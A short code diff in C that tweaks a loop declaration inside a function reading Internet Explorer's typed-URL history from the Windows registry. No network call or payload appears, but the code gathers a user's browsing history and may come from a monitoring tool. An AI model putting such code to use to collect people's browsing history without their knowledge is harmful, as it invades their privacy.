@@ -17,7 +17,8 @@ int GetIEHistory(int nHowMany) {
 	if(RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Explorer\\TypedURLs", 0,
 		KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS) return 0;
 	
-	for(int nURL = 0; nURL < nHowMany; nURL++){
+	int nURL;
+	for(nURL = 0; nURL < nHowMany; nURL++){
 		sprintf(szTemp, "url%d", (nURL + 1));
 		if(RegQueryValueExA(hKey, szTemp, NULL, NULL, NULL, &dwLength) == ERROR_SUCCESS){
 			char *szURL = (char *)malloc(dwLength);
